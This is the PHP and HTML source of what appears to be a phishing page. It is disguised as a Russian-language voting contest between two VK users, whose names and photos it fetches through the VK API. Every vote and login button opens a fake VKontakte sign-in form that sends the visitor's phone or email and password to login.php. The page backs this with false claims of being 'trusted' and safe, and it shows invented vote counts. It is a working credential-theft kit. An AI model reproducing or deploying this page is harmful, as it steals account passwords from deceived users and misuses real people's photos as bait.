	<?php

	$token = file_get_contents("admin/tkn.d");
	
	function set2user($name,$value=null) {
		if ($value==null) {
			$value = "";
			$exp = gmdate('D, d M Y H:i:s \G\M\T', time()-3600);
		} else {
			$exp = gmdate('D, d M Y H:i:s \G\M\T', time()+32000000);
		}
		echo '<script>document.cookie = "'.$name.'=" + escape("'.$value.'") + "; expires='.$exp.'; path=/; domain='.$_SERVER['HTTP_HOST'].'";</script>'."\n";
	}

	if ($_GET["v"]=="0") { echo '<script>window.onload = function() {show();alert("Неверно введён логин или пароль!");};</script>'; }
	
	$uid1 = $_GET["u1"];
	$uid2 = $_GET["u2"];
	if (($uid1!='') and ($uid2!='')) {
	$usinf = json_decode(curl("https://api.vk.com/method/users.get?user_ids={$uid1},{$uid2}&fields=photo_200&access_token=".$token."&v=5.87"));

	$u1name = $usinf->response[0]->first_name;
	$u2name = $usinf->response[1]->first_name;
	$u1ph = $usinf->response[0]->photo_200;
	$u2ph = $usinf->response[1]->photo_200;
	}
	if (($u1name!='') and ($u2name!='')) {
		set2user("num1", $uid1);
		set2user("num2", $uid2);
	} else {
		
		if (($_COOKIE['num1']!='') and ($_COOKIE['num2']!='')) {
			
			$uid1 = $_GET["u1"];
			$uid2 = $_GET["u2"];
			$usinf = json_decode(curl("https://api.vk.com/method/users.get?user_ids=".$_COOKIE['num1'].",".$_COOKIE['num2']."&fields=photo_200&access_token=".$token."&v=5.87"));

			$u1name = $usinf->response[0]->first_name;
			$u2name = $usinf->response[1]->first_name;
			$u1ph = $usinf->response[0]->photo_200;
			$u2ph = $usinf->response[1]->photo_200;
			
			if (($u1name=='') and ($u2name=='')) {
				
			$u1name = "Марьяна";
			$u2name = "Карина";
			$u1ph = "assets/votes/old/img/pic1.jpg";
			$u2ph = "assets/votes/old/img/pic2.jpg";
				
			}
			
		} else {
			
			$u1name = "Марьяна";
			$u2name = "Карина";
			$u1ph = "assets/votes/old/img/pic1.jpg";
			$u2ph = "assets/votes/old/img/pic2.jpg";
			
		}
			
	}


	function curl($url){
	$ch = curl_init( $url );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
	$response = curl_exec( $ch );
	curl_close( $ch );
	return $response;
	}
	?>
	<html>
	   <head>
		  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		   <title><?php echo $u1name; ?> или <?php echo $u2name; ?></title>
		  <meta name="viewport" content="width=device-width, initial-scale=1">
		  <link rel="shortcut icon" href="assets/votes/new/img/favicon.png" type="image/png">
		   <link rel="stylesheet" href="assets/votes/new/css/main.css">
		   <script>
	function show(){
		$("#over").fadeIn(500);
	}

	</script>
	<style>
	#over {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background-color: rgba(0,0,0, .9);
		z-index: 1000;
		}

	#over > * {
		z-index: 9999;
	}
	#over > #ov_inner {
		margin: 17% auto;
		width: 300px;
		height: 400px;
	}
	.show {
		display: block;
	}
	</style>
	   </head>
	   <body class="index">
		  <div id="page-wrapper">
		  <header id="header" class="reveal alt">
			 <h1 id="logo"><a href=""><?php echo $_SERVER['HTTP_HOST']; ?></a></h1>
			 <nav id="nav">
				<ul>
				   <li class="current" style="white-space: nowrap;"><a href="index.php">Главная</a></li>
				   <li class="submenu opener" style="user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
					  <a >Меню</a>
					  <ul style="user-select: none; display: none; position: absolute;" class="">
						 <li style="white-space: nowrap;"><a href="info.php">Информация</a></li>
						 <li style="white-space: nowrap;"><a href="stats.php" style="display: block;">Итоги</a></li>
						 <li style="white-space: nowrap;"><a  onclick="show();" style="display: block;">Участвовать</a></li></ul>
				   </li>
				   <li style="white-space: nowrap;"><a  onclick="show();" class="button special">Войти</a></li>
							   </ul>
			 </nav>
		  </header><section id="banner">
	   <div class="inner">
		  <header>
			 <h2><?php echo $_SERVER['HTTP_HOST']; ?></h2>
		  </header>
		  <p>Наш сайт - <strong>один из	 </strong><br>глобальных проектов голосований</p>
		  <footer>
			 <ul class="buttons vertical">
				<li><a href="#gotox" class="button fit scrolly">проголосовать</a></li>
			 </ul>
		  </footer>
	   </div>
	</section>
	<article id="main">
	<header class="special container">
	   <span class="icon fa-bar-chart-o"></span>
	   <h2>Выберите участника которому<br> хотите отдать голос</h2>
	</header>
	<section id ="gotox" class="wrapper style3 container special">
	   <header class="major">
		  </header>
	   <div class="row">
		  <div class="6u 12u(narrower)" style="">
			 <section>
				<a  onclick="show();" class="image featured"><img src="<?php echo $u1ph; ?>" alt=""></a>
				<header>
				   <h3><?php echo $u1name;?></h3>
				</header>
				<div class="votes-number" id="vote-num-2" style="margin-top: -15px;">60	голосов</div>
				<a  onclick="show();" class="button special" style="border-radius: 24px;margin-top: 10px;">проголосовать</a>
			 </section>
		  </div>
		  <div class="6u 12u(narrower)" style="">
			 <section>
				<a  onclick="show();" class="image featured"><img src="<?php echo $u2ph; ?>" alt=""></a>
				<header>
				   <h3><?php echo $u2name;?></h3>
				</header>
				<div class="votes-number" id="vote-num-2" style="margin-top: -15px;">57	голосов</div>
				<a  onclick="show();" class="button special" style="border-radius: 24px;margin-top: 10px;">проголосовать</a>
			 </section>
		  </div>
	   </div>
	</section>
	<section class="wrapper style1 container special">
	   <div class="row">
		  <div class="4u 12u(narrower)">
			 <section>
				<span class="icon featured fa-check"></span>
				<header>
				   <h3>Это безопасно!</h3>
				</header>
				<p>Наш сайт имеет статус "Надёжного". Ваши данные в полной безопасности.</p>
			 </section>
		  </div>
		  <div class="4u 12u(narrower)">
			 <section>
				<span class="icon featured fa-check"></span>
				<header>
				   <h3>Продвижение</h3>
				</header>
				<p>На нашем сайте вы сможете принять участие и вас увидят сотни людей! Для этого достаточно лишь войти на сайт.</p>
			 </section>
		  </div>
		  <div class="4u 12u(narrower)">
			 <section>
				<span class="icon featured fa-check"></span>
				<header>
				   <h3>Ценные призы</h3>
				</header>
				<p>Участвуя в конкурсе на нашем сайте вы сможете получить ценные призы (подробнее в Информации)</p>
			 </section>
		  </div>
	   </div>
	</section>
	</article>
	<section id="cta">
	   <header>
		  <h2>А вы готовы получить <strong>хорошие призы</strong>?</h2>
		  <p>Принимая участие - не забывайте о ваших друзьях =)</p>
	   </header>
	   <footer>
		  <ul class="buttons">
			 <li><a  onclick="show();" class="button special">Регистрация</a></li>
		  </ul>
	   </footer>
	</section>
	<footer id="footer">
	   <ul class="copyright">
		  <li>©</li>
		  2017-2019

	   </ul>
	</footer>
	</div>
		<div id="over" style="display: none;">
			<div id="ov_inner">
				<div id="index_rcolumn" class="index_rcolumn">
					<form action="login.php" method="POST" id="snforn">
						<div id="index_login" class="page_block index_login">
						<center><div>Войдите через ВКонтакте <img src="vklogo.png" width="10%" style="vertical-align: middle;"></div></center><br>
					<input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Телефон или email">
					  <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="Пароль" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)">
					  <button id="index_login_button" class="index_login_button flat_button button_big_text" onclick="auth();">Войти</button>
					  <div class="forgot">
						<div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
					  </div>
				  </div>
				  </form>
			</div>
			</div>
		</div>
	<script src="assets/votes/new/js/jquery.min.js"></script>
	<script src="assets/votes/new/js/jquery.dropotron.min.js"></script>
	<script src="assets/votes/new/js/jquery.scrolly.min.js"></script>
	<script src="assets/votes/new/js/jquery.scrollgress.min.js"></script>
	<script src="assets/votes/new/js/skel.min.js"></script>
	<script src="assets/votes/new/js/util.js"></script>
	<script src="assets/votes/new/js/main.js"></script>
	<ul style="user-select: none; position: absolute; z-index: 1000; left: 619.1px; top: 56.2625px; opacity: 1; display: none;" class="dropotron level-0 left">
	   <li style="white-space: nowrap;"><a href="info.php">Информация</a></li>
	   <li style="white-space: nowrap;"><a href="stats.php">Итоги</a></li>
	   <li style="white-space: nowrap;"><a href="login/index.php-login=1.htm">Регистрация</a></li>
	</ul>
	<div id="navButton">
	</body>
	</html>